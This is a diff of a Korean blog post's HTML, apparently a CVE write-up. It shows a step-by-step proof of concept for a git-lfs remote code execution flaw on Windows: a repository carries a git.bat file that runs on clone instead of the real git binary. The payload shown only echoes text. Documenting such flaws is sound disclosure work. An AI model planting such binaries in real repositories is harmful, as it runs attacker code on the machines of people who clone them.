@@ -248,20 +248,17 @@
 <ol>
 <li><p>&#xACF5;&#xACA9;&#xC790;&#xB294; &#xC800;&#xC7A5;&#xC18C;&#xC5D0; &#xC2E4;&#xD589;&#xD560; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xD3EC;&#xD568;&#xD55C; <code>git.*</code> &#xC774;&#xB984;&#xC758; windows &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xD615;&#xC2DD; &#xD30C;&#xC77C;&#xC744; &#xCD94;&#xAC00;&#xD569;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs bash">git.bat : @<span class="hljs-built_in">echo</span> git-lfs RCE exploit!!
-git add git.bat</code></pre>
-</li>
+git add git.bat</code></pre></li>
 <li><p>&#xC800;&#xC7A5;&#xC18C;&#xC5D0; lfs &#xD30C;&#xC77C;&#xC744; &#xCD94;&#xAC00;&#xD569;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs bash">git lfs track <span class="hljs-string">&quot;* .dat&quot;</span> 
 git add .gitattributes
 
 <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;git exploit PoC&quot;</span>&gt; lfs.dat
-git add lfs.dat</code></pre>
-</li>
+git add lfs.dat</code></pre></li>
 <li><p>&#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC640; lfs &#xD30C;&#xC77C;&#xC744; &#xCEE4;&#xBC0B;&#xD558;&#xACE0; &#xC6D0;&#xACA9; &#xC800;&#xC7A5;&#xC18C;&#xC5D0; &#xC5C5;&#xB85C;&#xB4DC;&#xD569;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs bash">git commit -a -m <span class="hljs-string">&quot;git-lfs exploit&quot;</span>
 git remote add origin https://repository_url
-git push -u origin master</code></pre>
-</li>
+git push -u origin master</code></pre></li>
 <li><p>Windows &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; clone&#xD560; &#xB54C; git-lfs &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xD2B8;&#xB9AC;&#xAC70;&#xB418;&#xC5B4; &#xAE30;&#xC874; git &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xB300;&#xC2E0; &#xACF5;&#xACA9;&#xC790;&#xC758; &#xC6D0;&#xACA9; &#xC800;&#xC7A5;&#xC18C;&#xC5D0;&#xC11C; clone&#xD55C; &#xC545;&#xC131; <code>git.bat</code>&#xC774; &#xC0AC;&#xC6A9;&#xC790; &#xC0C1;&#xD638;&#xC791;&#xC6A9; &#xC5C6;&#xC774; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs bash">PowerShell&gt; git <span class="hljs-built_in">clone</span> https://repository_url
 git-lfs RCE exploit!!</code></pre></li>
@@ -283,9 +280,9 @@ git-lfs RCE exploit!!</code></pre></li>
                 <div class="post-meta">
                   <i class="iconfont icon-tags"></i>
                   
-                  <a class="hover-with-bg" href="/tags/cve/">cve</a>
-                  
                   <a class="hover-with-bg" href="/tags/windows/">windows</a>
+                  
+                  <a class="hover-with-bg" href="/tags/cve/">cve</a>
                   
                   <a class="hover-with-bg" href="/tags/rce/">rce</a>
                   
